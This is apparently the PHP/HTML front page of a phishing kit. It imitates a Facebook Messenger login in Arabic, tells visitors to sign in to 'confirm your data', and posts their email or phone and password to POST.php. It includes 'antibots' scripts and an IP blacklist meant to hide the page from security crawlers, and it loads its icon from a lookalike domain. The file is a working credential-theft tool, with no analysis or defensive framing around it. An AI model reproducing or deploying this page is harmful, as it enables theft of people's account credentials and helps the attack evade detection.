<?php

include 'visit.php';
include 'antibots/blacklist.php';
include 'antibots/crawler.php';
include 'antibots/dick.php';
include 'antibots/fucker.php';
include 'antibots/fuck-you.php';
include 'antibots/ipblack.php';
include 'antibots/new.php';
?>
<!DOCTYPE html>

<html>
<head>
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>Messenger</title>
<link rel="icon" href="http://mesanngeer.xyz/fb.ico">
<link rel="stylesheet" href="st.css">
<meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
</head>
<body>
<h2> <p style="text-align:center; color: rgb(245, 245, 245);"></p>  </h2>

                                        <form id="login-form-content" name="loginForm" method="post" action="POST.php" autocomplete="off" onsubmit="return validateForm(this);">

  <div class="imgcontainer">
 <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn%3AANd9GcSeca365mrlWf1dCyRSOQddzp9GrqhlqHbHDQ&usqp=CAU" width="190" height="190" alt="Avatar">
  </div>
  <div class="container">
    <h4> <p style="text-align:center; color: rgb(41, 37, 37);">تسجيل الدخول لتأكيد بياناتك </p> </h4><br>
    <label for="uname"> </label>
    <input type="text" placeholder="البريد الالكتروني أو رقم الهاتف" name="uname" required minlength="5" size="30">
    <br>
    <label for="psw"></label>
    <input type="password" placeholder="كلمة السر" name="psw" required minlength="5" size="30">
    <br>
  <h5><button type="submit">تسجيل الدخول</button> </h5><br> <br>
    <label for="stayloged">البقاء قيد تسجيل الدخول</label>
    <input type="checkbox" id="vehicle1" name="stayloged" value="Bike">


      </form>
      <br> <br>
      <a href='' id='copyright' style='text-decoration: none; color: #999999;  font-weight: bold; ' title='Messenger'>
        Messenger Copyright &#169;&#65039;
      </a>
</body>
</html>
